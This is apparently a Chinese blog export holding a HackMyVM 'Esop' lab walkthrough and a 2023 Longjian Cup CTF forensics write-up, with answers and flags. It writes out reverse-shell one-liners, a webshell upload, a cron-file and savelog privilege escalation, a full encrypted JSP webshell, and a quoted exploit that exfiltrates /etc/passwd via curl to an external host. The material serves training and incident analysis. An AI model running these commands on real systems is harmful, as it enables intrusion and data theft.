[{"title":"Esop","url":"/2024/07/18/Esop/","content":"信息收集看一下靶机在哪个ip\n ⚡ root@kali  /home/cvbxy/Desktop  arp-scan -l -I eth0 Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:f1:bc, IPv4: 192.168.56.104Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0b       (Unknown: locally administered)192.168.56.100  08:00:27:af:e4:80       PCS Systemtechnik GmbH192.168.56.103  08:00:27:23:92:04       PCS Systemtechnik GmbH\n\n访问192.168.56.103，确认为靶机\nnmap：\n ⚡ root@kali  /home/cvbxy/Desktop  nmap -sCV -p 1-65535 192.168.56.103 --min-rate=100PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)| ssh-hostkey: |   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)80/tcp open  http    nginx| http-robots.txt: 1 disallowed entry |_/|_http-title: EspoCRMMAC Address: 08:00:27:23:92:04 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n目录扫描\n ⚡ root@kali  /home/cvbxy/Desktop  dirsearch -u http://192.168.56.103/[13:48:30] 301 -  162B  - /admin  -&gt;  http://192.168.56.103/admin/[13:48:30] 301 -  162B  - /admin.  -&gt;  http://192.168.56.103/admin./[13:48:31] 200 -  439B  - /admin/[13:48:31] 200 -  439B  - /admin/index.html[13:48:38] 200 -  439B  - /adminindex.html[13:48:41] 301 -  162B  - /api  -&gt;  http://192.168.56.103/api/[13:48:41] 301 -  162B  - /api/v1  -&gt;  http://192.168.56.103/api/v1/[13:48:41] 401 -    0B  - /api/v1/[13:48:41] 401 -    0B  - /api/v1/swagger.yaml[13:48:41] 401 -    0B  - /api/v1/swagger.json[13:48:49] 301 -  162B  - /client  -&gt;  http://192.168.56.103/client/[13:49:07] 301 -  162B  - /install  -&gt;  http://192.168.56.103/install/[13:49:08] 302 -    0B  - /install/  -&gt;  http://192.168.56.103/[13:49:08] 302 -    0B  - /install/index.php?upgrade/  -&gt;  http://192.168.56.103/index.php[13:49:28] 301 -  162B  - /portal  -&gt;  http://192.168.56.103/portal/[13:49:28] 404 -   50B  - /portal/[13:49:33] 200 -   26B  - /robots.txt\n\n访问/admin.，没什么用\n查看中间件信息\nnginx存在路径穿越漏洞，尝试一下发现漏洞存在\nnginx路径穿越漏洞\n\ndirsearch的默认字典跑不出来有用的东西，换个字典\n ⚡ root@kali  /home/cvbxy/Desktop  ffuf -u http://192.168.56.103/admin../FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 3ms]    * FUZZ: admin[Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 10ms]    * FUZZ: [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 9ms]    * FUZZ: _oldsite\n\n访问_oldsite\n\n继续扫下一层的\n ⚡ root@kali  /home/cvbxy/Desktop  ffuf -u http://192.168.56.103/admin../_oldsite/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt [Status: 200, Size: 540, Words: 72, Lines: 12, Duration: 12ms]    * FUZZ: info[Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 1ms]    * FUZZ:\n\n访问info，得到一个文件，说/admin/_oldsite目录下有一个zip备份文件\n# Backup Configuration Settings# This configuration file dictates the backup protocols for critical data storage.# Directory for storing backup files# All backup files are stored in compressed ZIP format for efficient space usage and security.# Ensure that backups are regularly updated and verified for data integrity.backup_directory: /admin/_oldsitebackup_format: zip# Note: The backup directory is designated for ZIP file backups only. # Regular maintenance and checks are required to ensure data consistency and reliability.\n\n指定zip后缀重新扫\n ⚡ root@kali  /home/cvbxy/Desktop  ffuf -u http://192.168.56.103/admin../_oldsite/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .zip[Status: 200, Size: 37975754, Words: 0, Lines: 0, Duration: 0ms]    * FUZZ: backup.zip[Status: 200, Size: 540, Words: 72, Lines: 12, Duration: 5ms]    * FUZZ: info[Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 7ms]    * FUZZ:\n\n得到备份文件，找一下配置文件，在/data/config.php找到用户名和密码，登录\n\n\n获取shell查看espo的版本\nsearchsploit查找相关漏洞，漏洞版本太低\n ⚡ root@kali  /home/cvbxy/Desktop  searchsploit espocrm  ------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                   |  Path------------------------------------------------------------------------------------------------- ---------------------------------EspoCRM 5.8.5 - Privilege Escalation                                                             | multiple/webapps/48376.txt------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results\n\nGoogle查找相关漏洞\n\n\n下载exp，主要是两个文件一个webshell，另一个php有点问题(网上找exp的时候还是得看看exp，指不定就混进了脏东西)\n&lt;?phpclass BeforeInstall&#123;    protected $container;    public function run($container)    &#123;\texec(&quot;curl -d @/etc/passwd http://prkbbh2hrcsruo99x2soswfw0n6eu3.oastify.com&quot;);\t&#125;&#125;\n\n\n留下webshell，上传\n\n访问\n\n反弹shell\nnc -e /bin/bash 192.168.56.104 7777 ⚡ root@kali  /home/cvbxy/Desktop  nc -lvvp 7777listening on [any] 7777 ...192.168.56.103: inverse host lookup failed: Unknown hostconnect to [192.168.56.104] from (UNKNOWN) [192.168.56.103] 47380lsapiindex.phpinstalloauth-callback.phpportalrobots.txtwebshell.php# 拓展shellpython3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@espo:~/html/public$ \n\n提权有个mandie，权限不够无法读取user.txt\nwww-data@espo:~/html/public$ cd /homewww-data@espo:/home$ lsmandiewww-data@espo:/home$ cd mandiewww-data@espo:/home/mandie$ lscopyPics  pictures  user.txt  videoswww-data@espo:/home/mandie$ cat user.txtcat user.txtcat: user.txt: Permission denied\n\npspy64查看进程\n\n可以看到copyPics是一个定时任务，还有一个root权限的定时任务\n方法一查看copyPics文件\n#!/bin/bash# 定义源目录和目标目录SOURCE_MEDIAS=&quot;/var/shared_medias&quot;PICTURES_DIR=&quot;$HOME/pictures&quot;VIDEOS_DIR=&quot;$HOME/videos&quot;# 查找源目录中所有不可执行的文件并复制到用户主目录，忽略错误/usr/bin/find &quot;$SOURCE_MEDIAS&quot; ! -executable -exec /usr/bin/cp &#123;&#125; &quot;$HOME&quot; 2&gt;/dev/null \\;# 创建目标目录，如果不存在的话mkdir -p &quot;$PICTURES_DIR&quot; &quot;$VIDEOS_DIR&quot;# 定义一个关联数组来存储目录与文件扩展名的映射declare -A directory_mappingsdirectory_mappings=( [&quot;$PICTURES_DIR&quot;]=&quot;jpeg jpg&quot; [&quot;$VIDEOS_DIR&quot;]=&quot;mp4 avi&quot; )# 遍历关联数组，将不同类型的文件移动到相应的目录中for dir in &quot;$&#123;!directory_mappings[@]&#125;&quot;; do    for ext in $&#123;directory_mappings[$dir]&#125;; do        mv &quot;$HOME&quot;/*.$ext &quot;$dir/&quot; 2&gt;/dev/null    donedone\n\n将mandie目录下的copyPics文件复制一份到/var/shared_medias下，修改权限为666\nwww-data@espo:/var/shared_medias$ cp /home/mandie/copyPics copyPicswww-data@espo:/var/shared_medias$ lsbedroom.jpg  copyPics      dorothy.jpeg  maldives.jpgburger.jpeg  dad-baby.jpg  family.jpg    sky.mp4www-data@espo:/var/shared_medias$ chmod 666 copyPicswww-data@espo:/var/shared_medias$ ls -ll-rw-rw-rw-  1 www-data www-data     543 Jul 11 07:33 copyPicswww-data@espo:/var/shared_medias$ echo &quot;sh -i &gt;&amp; /dev/tcp/192.168.56.104/6666 0&gt;&amp;1&quot; &gt;&gt; copyPics&lt;i &gt;&amp; /dev/tcp/192.168.56.104/6666 0&gt;&amp;1&quot; &gt;&gt; copyPicswww-data@espo:/var/shared_medias$ cat copyPics#!/bin/bashSOURCE_MEDIAS=&quot;/var/shared_medias&quot;PICTURES_DIR=&quot;$HOME/pictures&quot;VIDEOS_DIR=&quot;$HOME/videos&quot;/usr/bin/find &quot;$SOURCE_MEDIAS&quot; ! -executable -exec /usr/bin/cp &#123;&#125; &quot;$HOME&quot; 2&gt;/dev/null \\;mkdir -p &quot;$PICTURES_DIR&quot; &quot;$VIDEOS_DIR&quot;declare -A directory_mappingsdirectory_mappings=( [&quot;$PICTURES_DIR&quot;]=&quot;jpeg jpg&quot; [&quot;$VIDEOS_DIR&quot;]=&quot;mp4 avi&quot; )for dir in &quot;$&#123;!directory_mappings[@]&#125;&quot;; do    for ext in $&#123;directory_mappings[$dir]&#125;; do        mv &quot;$HOME&quot;/*.$ext &quot;$dir/&quot; 2&gt;/dev/null    donedonesh -i &gt;&amp; /dev/tcp/192.168.56.104/6666 0&gt;&amp;1\n\n获得mandie用户权限\n ⚡ root@kali  /home/cvbxy  nc -lvvp 6666 -s 192.168.56.104mandie@espo:~$ cat /home/mandie/user.txtcat /home/mandie/user.txtb462a4ac056477047a56ea23e6bbce19\n\n查看有没有sudo能执行的命令\nmandie@espo:~$ sudo -lsudo -lsudo: unable to resolve host espo: Temporary failure in name resolutionMatching Defaults entries for mandie on espo:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,    use_ptyUser mandie may run the following commands on espo:    (ALL : ALL) NOPASSWD: /usr/bin/savelog\n\nsavelog提权\nmandie@espo:~$ savelog -hsavelog -hUsage: savelog [-m mode] [-u user] [-g group] [-t] [-c cycle] [-p]             [-j] [-C] [-d] [-l] [-r rolldir] [-n] [-q] file ...        -x script  - invoke script with rotated log file in $FILEmandie@espo:~$ find / -name &quot;*.log&quot; 2&gt;/dev/null/var/www/html/data/logs/espo-2023-12-04.log/var/www/html/data/logs/espo-2024-01-24.log/var/www/html/data/logs/espo-2024-07-11.log/var/log/alternatives.log/var/log/nginx/access.log/var/log/nginx/error.log/var/log/dpkg.log/var/log/php8.2-fpm.log/var/lib/mysql/ddl_recovery-backup.log/var/lib/mysql/ddl_recovery.logmandie@espo:~$ sudo /usr/bin/savelog -x bash /var/log/nginx/error.logsudo: unable to resolve host espo: Temporary failure in name resolutioniduid=0(root) gid=0(root) groups=0(root)python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;root@espo:/home/mandie# cat /home/mandie/user.txtb462a4ac056477047a56ea23e6bbce19root@espo:/home/mandie# cat /root/root.txt0f4580e1632070ea32ead6334c0527c4\n\n方法二cron.php可写\nwww-data@espo:~/html$ ls -al-rw-r--r--  1 www-data www-data  1578 Jul 11 07:36 cron.php\n\n直接通过root用户的定时任务反弹shell，将反弹shell语句写入cron.php\nwww-data@espo:~/html$ echo &quot;system(&#x27;nc 192.168.56.104 5555 -c /bin/bash&#x27;);&quot; &gt;&gt; cron.php┌──(cvbxy㉿kali)-[~]└─$ nc -lvvp 5555 -s 192.168.56.104root@espo:/home/mandie# cat user.txtcat user.txtb462a4ac056477047a56ea23e6bbce19root@espo:/home/mandie# cat /root/root.txtcat /root/root.txt0f4580e1632070ea32ead6334c0527c4\n","categories":["渗透测试"],"tags":["HackMyVm","靶机"]},{"title":"2023陇剑杯","url":"/2024/06/20/2023%E9%99%87%E5%89%91%E6%9D%AF/","content":"1\nIncidentResponse\n你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网IP是10.221.36.21。查询CMDB后得知该IP运行了公司的工时系统。（虚拟机账号密码为：root&#x2F;IncidentResponsePasswd）挖矿程序所在路径是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）本题附件见于平台公告的IR.zip，解压密码为f0b1ba11478343f404666c355919de3fecho -n ‘&#x2F;etc&#x2F;redis&#x2F;redis-server’|md5sum|cut -d ‘ ‘ -f16f72038a870f05cbf923633066e48881\n\n对ova文件用r-studio进行恢复，把vmdk文件提取出来\n\n用DiskGenius恢复vmdk里面的文件\n\nova导入虚拟机，ps -ef 查看运行的进程\n\n发现&#x2F;etc&#x2F;redis目录下有可疑文件\n\n\n挖矿程序连接的矿池域名是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）echo -n ‘donate.v2.xmrig.com’|md5sum|cut -d ‘ ‘ -f13fca20bb92d0ed67714e68704a0a4503\n\n\n\n攻击者入侵服务器的利用的方法是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）题目提示：答案md5值前两位为3eecho -n ‘shirodeserialization’|md5sum|cut -d ‘ ‘ -f13ee726cb32f87a15d22fe55fa04c4dcd\n\n&#x2F;home&#x2F;app目录下的log里面可以找到shiro的报错，应该是shiro反序列化\n\n\n攻击者的IP是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）echo -n ‘81.70.166.3’|md5sum|cut -d ‘ ‘ -f1c76b4b1a5e8c9e7751af4684c6a8b2c9\n\n查看日志\n\n\n\n攻击者发起攻击时使用的User-Agent是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）echo -n ‘mozilla&#x2F;5.0(compatible;baiduspider&#x2F;2.0;+http://www.baidu.com/search/spider.html)&#39;|md5sum|cut -d ‘ ‘ -f16ba8458f11f4044cce7a621c085bb3c6\n\n日志文件末尾的POST包\n\n\n攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以a开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）echo -n ‘&#x2F;root&#x2F;.ssh&#x2F;authorized_keys’|md5sum|cut -d ‘ ‘ -f1a1fa1b5aeb1f97340032971c342c4258\n\n在流量包里面发现了修改root的authorized_keys\n\n攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以b开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）echo -n ‘&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;redis.service’|md5sum|cut -d ‘ ‘ -f1b2c5af8ce08753894540331e5a947d35\n\n查找所有与redis相关的文件，看到一个疑似开机自启的服务\n\nbaby_forensics\n磁盘中的key是多少？本题附件见于平台公告的BF.zip，解压密码为4cf611fce4a2fec305e54c2766b7c8602e80307085fd2b5c49c968c323ee25d5\n\n┌──(root㉿kali)-[/tmp]└─# vol.py -f baby.raw imageinfoVolatility Foundation Volatility Framework 2.6.1INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)                     AS Layer2 : FileAddressSpace (/tmp/baby.raw)                      PAE type : No PAE                           DTB : 0x187000L                          KDBG : 0xf800040420a0L          Number of Processors : 4     Image Type (Service Pack) : 1                KPCR for CPU 0 : 0xfffff80004043d00L                KPCR for CPU 1 : 0xfffff880009ef000L                KPCR for CPU 2 : 0xfffff88004569000L                KPCR for CPU 3 : 0xfffff880045df000L             KUSER_SHARED_DATA : 0xfffff78000000000L           Image date and time : 2022-05-29 12:14:16 UTC+0000     Image local date and time : 2022-05-29 20:14:16 +0800┌──(root㉿kali)-[/tmp]└─# vol.py -f baby.raw --profile=Win7SP1x64 filescan | grep &quot;key.txt&quot; Volatility Foundation Volatility Framework 2.6.10x000000003df80070      2      0 -W-rwd \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\vmware-admin\\VMwareDnD\\abafa01a\\key.txt0x000000003df94070     16      0 RW---- \\Device\\HarddiskVolume3\\key.txt┌──(root㉿kali)-[/tmp]└─# vol.py -f baby.raw --profile=Win7SP1x64 dumpfiles -Q &#x27;0x000000003df80070&#x27; -D /tmpVolatility Foundation Volatility Framework 2.6.1DataSectionObject 0x3df80070   None   \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\vmware-admin\\VMwareDnD\\abafa01a\\key.txt┌──(root㉿kali)-[/tmp]└─# cat file.None.0xfffffa800e7f96f0.dat E96&lt;6J:Da6g_b_f_gd75a3d4ch4heg4bab66ad5d\n\n\n\n电脑中正在运行的计算器的运行结果是多少？7598632541\n\n方法一┌──(root㉿kali)-[/tmp]└─# vol.py -f baby.raw --profile=Win7SP1x64 windows &gt; dump# windoes:Print Desktop Windows (verbose details)\n\n\n方法二┌──(root㉿kali)-[/tmp]└─# vol.py -f baby.raw --profile=Win7SP1x64 psscan        Volatility Foundation Volatility Framework 2.6.1Offset(P)          Name                PID   PPID PDB                Time created                   Time exited                   ------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------0x000000003dd2cb30 calc.exe           2844   2552 0x000000000eb93000 2022-05-29 11:50:36 UTC+0000                                 0x000000003ddbeb30 StikyNot.exe       2968   2552 0x00000000366e7000 2022-05-29 12:05:25 UTC+0000                                 0x000000003de20910 explorer.exe       2552   2516 0x0000000032058000 2022-04-14 11:14:06 UTC+0000                                 0x000000003de22060 dwm.exe            2528    884 0x0000000031ee7000 2022-04-14 11:14:06 UTC+0000                                 0x000000003de4b6b0 WmiPrvSE.exe       2312    644 0x0000000032adc000 2022-04-14 11:14:03 UTC+0000                                 0x000000003df62890 vmtoolsd.exe       2660   2552 0x000000002b715000 2022-04-14 11:14:07 UTC+0000                                 0x000000003dfda910 SearchIndexer.     2884    520 0x0000000026bf8000 2022-04-14 11:14:13 UTC+0000                                 0x000000003e014060 rundll32.exe       2104    644 0x0000000000c26000 2022-04-14 11:14:02 UTC+0000                                 0x000000003e021b30 vmtoolsd.exe       1544    520 0x000000000dd3b000 2022-04-14 11:14:02 UTC+0000                                 0x000000003e075b30 taskhost.exe       1696    520 0x000000000a03b000 2022-04-14 11:14:02 UTC+0000                                 0x000000003e10f630 sppsvc.exe         1952    520 0x0000000007832000 2022-04-14 11:14:02 UTC+0000                                 0x000000003e148820 svchost.exe        2016    520 0x0000000007a03000 2022-04-14 11:14:02 UTC+0000                                 0x000000003e197630 dllhost.exe        1792    520 0x0000000006b10000 2022-04-14 11:14:02 UTC+0000                                 0x000000003e243b30 spoolsv.exe        1148    520 0x00000000122cf000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e275b30 svchost.exe        1180    520 0x0000000011b4d000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e302440 taskhost.exe       1748    520 0x0000000021982000 2022-05-29 11:43:51 UTC+0000                                 0x000000003e335b30 svchost.exe        1320    520 0x0000000010492000 2022-04-14 11:14:02 UTC+0000                                 0x000000003e3aab30 VGAuthService.     1404    520 0x000000000f15c000 2022-04-14 11:14:02 UTC+0000                                 0x000000003e3f9400 svchost.exe        2976    520 0x000000000bfc6000 2022-05-29 11:44:06 UTC+0000                                 0x000000003e430360 wmpnetwk.exe       1064    520 0x0000000014c8c000 2022-05-29 11:44:07 UTC+0000                                 0x000000003e436b30 svchost.exe         644    520 0x00000000185ed000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e45f460 vmacthlp.exe        708    520 0x0000000018550000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e47e5f0 svchost.exe         752    520 0x0000000017ad6000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e4bb740 svchost.exe         840    520 0x0000000017ce9000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e4e4b30 svchost.exe         884    520 0x00000000172f0000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e4edb30 svchost.exe         908    520 0x000000001723e000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e566830 svchost.exe         368    520 0x00000000164c5000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e59eb30 svchost.exe         988    520 0x0000000015dce000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e733b30 msdtc.exe          2092    520 0x000000003b51a000 2022-04-14 11:14:02 UTC+0000                                 0x000000003e75d510 wininit.exe         412    344 0x000000001acc3000 2022-04-14 11:14:00 UTC+0000                                 0x000000003e768460 csrss.exe           420    404 0x000000001ac8a000 2022-04-14 11:14:00 UTC+0000                                 0x000000003e798b30 winlogon.exe        468    404 0x000000001a390000 2022-04-14 11:14:00 UTC+0000                                 0x000000003e7ba7c0 services.exe        520    412 0x0000000018e7b000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e7c4b30 lsass.exe           536    412 0x0000000018da3000 2022-04-14 11:14:01 UTC+0000                                 0x000000003e7cb7b0 lsm.exe             544    412 0x000000001906b000 2022-04-14 11:14:01 UTC+0000                                 0x000000003ee32530 dllhost.exe        3420    644 0x0000000024b7a000 2022-05-29 12:14:17 UTC+0000                                 0x000000003ee8d590 DumpIt.exe         3212   2552 0x0000000001cdf000 2022-05-29 12:14:13 UTC+0000                                 0x000000003ee92060 conhost.exe        3236    420 0x0000000012664000 2022-05-29 12:14:13 UTC+0000                                 0x000000003ef11790 dllhost.exe        2488    644 0x0000000001f1a000 2022-05-29 12:14:13 UTC+0000                                 0x000000003efa76f0 dllhost.exe        2836    644 0x0000000037d5a000 2022-05-29 12:14:13 UTC+0000                                 0x000000003efd0790 dllhost.exe        2488    644 0x0000000001f1a000 2022-05-29 12:14:13 UTC+0000                                 0x000000003f1ab060 dllhost.exe        3364    644 0x0000000032a08000 2022-05-29 12:13:10 UTC+0000                                 0x000000003f1adb30 SearchFilterHo     3936   2884 0x000000000ec8c000 2022-05-29 12:14:00 UTC+0000                                 0x000000003f1e0060 taskhost.exe       3244    520 0x0000000020df5000 2022-05-29 12:13:06 UTC+0000                                 0x000000003f1e9060 iexplore.exe       3532   3480 0x0000000025a35000 2022-05-29 12:13:21 UTC+0000                                 0x000000003f1f6b30 SearchProtocol     3916   2884 0x000000001b2e9000 2022-05-29 12:14:00 UTC+0000                                 0x000000003f2e7780 iexplore.exe       3480   2552 0x00000000115d5000 2022-05-29 12:13:21 UTC+0000                                 0x000000003f5a6b30 csrss.exe           360    344 0x000000001b6bd000 2022-04-14 11:14:00 UTC+0000                                 0x000000003f5af6f0 audiodg.exe        1276    840 0x0000000039805000 2022-05-29 12:07:28 UTC+0000                                 0x000000003f5fb650 smss.exe            268      4 0x00000000204fc000 2022-04-14 11:13:59 UTC+0000                                 0x000000003fe39060 iexplore.exe       3824   3480 0x0000000014820000 2022-05-29 12:13:59 UTC+0000                                 0x000000003ff40b30 System                4      0 0x0000000000187000 2022-04-14 11:13:59 UTC+0000                                                                                                                                                                                               ┌──(root㉿kali)-[/tmp]└─# vol.py -f baby.raw --profile=Win7SP1x64 memdump -p 2844 -D /tmpVolatility Foundation Volatility Framework 2.6.1************************************************************************Writing calc.exe [  2844] to 2844.dmp\n\n将后缀改成data，然后用gimp查看data\n\n\n该内存文件中存在的flag值是多少？flag{ad9bca48-c7b0-4bd6-b6fb-aef90090bb98}\n\n方法一导出StikyNot.exe，将后缀改成data，然后用gimp查看data\n┌──(root㉿kali)-[/tmp]└─# vol.py -f baby.raw --profile=Win7SP1x64 memdump -p 2968 -D /tmpVolatility Foundation Volatility Framework 2.6.1************************************************************************Writing StikyNot.exe [  2968] to 2968.dmp\n\n\n\n方法二将raw文件直接用010打开，然后可以发现疑似密文的东西\n\n疑似密码，用aes解密\n\n\nhard_web\n服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为80,81,82,83)80,888,8888\n\n统计→会话可以发现存在端口扫描行为\n\n 可以发现80,888,,8888三个端口\n\ntcp.connection.synack and ip.dst==192.168.162.180\n\n\n服务器中根目录下的flag值是多少？flag{9236b29d-5488-41e6-a04b-53b0d8276542}\n\n网站本身就存在的木马test.jsp\n\n&lt;%! String xc=&quot;748007e861908c03&quot;; class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;%&gt;&lt;%try&#123;byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;, data);Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;\n\n解密POST的jsp数据\n\n找到最后一个shell.jsp的包，解密即可\n\n\n该webshell的连接密码是多少？14mk3y\n\n找到倒数第三个jsp流量包，解密发现需要爆破密码\n\nimport hashlibimport stringdef generate_md5(input_string):    md5 = hashlib.md5()    md5.update(input_string.encode(&#x27;utf-8&#x27;))    return md5.hexdigest()s = string.ascii_letters + string.digits + string.punctuationfor a in s:    for b in s:        for c in s:            for d in s:                input = &#x27;1&#x27; + a + b + c + d + &#x27;y&#x27;                if generate_md5(input)[:16]  == &#x27;748007e861908c03&#x27;:                    print(input)\n\n\nsevrer save\n黑客是使用什么漏洞来拿下root权限的。格式为：CVE-2020-114514本题附件见于平台公告的SS.zip，解压密码为c77ad47ba4c85fae66f08ec12e0085ddCVE-2022-22965\n\n\n\n\n黑客反弹shell的ip和端口是什么，格式为：10.0.0.1:4444192.168.43.128:2333\n\n\n\n黑客的病毒名称是什么？ 格式为：filenamemain\n\n&#x2F;home&#x2F;guests目录下面发现可疑文件\n\n\n黑客的病毒运行后创建了什么用户？请将回答用户名与密码：username:passwordll:123456\n\n查看&#x2F;etc&#x2F;shadow文件\n\n\n服务器在被入侵时外网ip是多少? 格式为：10.10.0.1172.105.202.239\n\n查看log.txt\n\n\n病毒运行后释放了什么文件？格式：文件1,文件2lolMiner,mine_doge.sh\n\n.idea为main病毒释放的文件\n\n\n矿池地址是什么？ 格式：domain:1234doge.millpools.cc:5567\n\n查看sh文件，可以发现矿池地址和钱包地址\n\n\n黑客的钱包地址是多少？格式：xx:xxxxxxxxDRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9\n\nWireshark\n被入侵主机的IP是？192.168.246.28\n\n\n\n被入侵主机的口令是？youcannevergetthis\n\n\n\n用户目录下第二个文件夹的名称是？Downloads\n\n\n\n&#x2F;etc&#x2F;passwd中倒数第二个用户的用户名是？mysql\n\n\nSmallSword\n连接蚁剑的正确密码是__?（答案示例：123asd）6ea280898e404bfabd0ebb702327b19f\n\n\n\n攻击者留存的值是__?(答案示例：d1c3f0d3-68bb-4d85-a337-fb97cf99ee2e)ad6269b7-3ce2-4ae8-b97f-f259515e7a91\n\n\n\n\n攻击者下载到的flag是__?(答案示例：flag3{uuid})flag{8f0dffac-5801-44a9-bd49-e66192ce4f57}\n\n\n文件-&gt;导出对象-&gt;http-&gt;Save All-&gt;保存到文件夹中，info(12)有5m，是上面的exe文件对应的流量，拖入010editor\n\n从第三位开始是4D5A90是EXE文件的头部信息特征,所以我们删除前面三个,将其另存为exe执行\n\n看别人的wp写运行之后会生成图片，我的不行，放到微步的沙箱可以生成\n\n爆破宽高\n\n\n\n\nez_web\n服务器自带的后门文件名是什么？（含文件后缀）ViewMore.php\n\n\n\n服务器的内网IP是多少？192.168.101.132\n\n\n\n攻击者往服务器中写入的key是什么？7d9ddff2-2d67-4eba-9e48-b91c26c42337\n\n\n\n是一个压缩包\n\n提取压缩包\necho UEsDBBQAAQAAANgDvlTRoSUSMAAAACQAAAAHAAAAa2V5LnR4dGYJZVtgRzdJtOnW1ycl/O/AJ0rmzwNXxqbCRUq2LQid0gO2yXaPBcc9baLIAwnQ71BLAQI/ABQAAQAAANgDvlTRoSUSMAAAACQAAAAHACQAAAAAAAAAIAAAAAAAAABrZXkudHh0CgAgAAAAAAABABgAOg7Zcnlz2AE6DtlyeXPYAfldXhh5c9gBUEsFBgAAAAABAAEAWQAAAFUAAAAAAA== | base64 -d &gt; a.zip\n\n结合前面的密码\n\n\ntcpdump\n攻击者通过暴力破解进入了某Wiki 文档，请给出登录的用户名与密码，以:拼接，比如admin:adminTMjpxFGQwD:123457\n\nhttp &amp;&amp; !http.request.uri contains &quot;login&quot; &amp;&amp; !tcp contains &quot;用户名或密码错误&quot; &amp;&amp; http.response.code !=404\n\n\n\n攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值。（32位小写）383c74db4e32513daaa1eeb1726d7255\n\n成功之后的Cookie有accessToken特征，所以搜accessToken，http contains &quot;accessToken&quot;\n\n\n\n攻击使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接，比如root:123456zyplayer:1234567\n\ntcp contains 